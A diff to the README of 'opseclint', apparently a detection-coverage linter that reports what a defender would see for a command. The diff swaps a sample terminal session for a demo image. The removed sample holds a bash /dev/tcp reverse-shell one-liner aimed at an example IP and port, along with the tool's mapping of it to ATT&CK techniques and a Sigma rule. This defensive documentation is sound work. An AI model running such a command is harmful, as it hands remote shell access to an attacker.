@@ -10,21 +10,7 @@ detectability score.
 
 It answers one question: **"what would a defender see?"**
 
-```
-$ opseclint -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'
-
-opseclint — detection-coverage report (linux-auditd)
-1 line(s) analyzed, 1 finding(s)
-
-  L1    [CRITICAL 82]  Bash /dev/tcp reverse shell — interactive C2 channel
-        technique  T1059.004 Command and Scripting Interpreter: Unix Shell
-        technique  T1071 Application Layer Protocol
-        telemetry  bash execve() followed by connect() to attacker IP
-        telemetry  stdin/stdout/stderr duped to a socket fd
-        detection  Sigma: Reverse shell via /dev/tcp redirection (proc_creation_lnx) (high confidence)
-
-summary  loudest action: CRITICAL (82)
-```
+![opseclint demo](docs/demo.svg)
 
 ## Who it's for
 
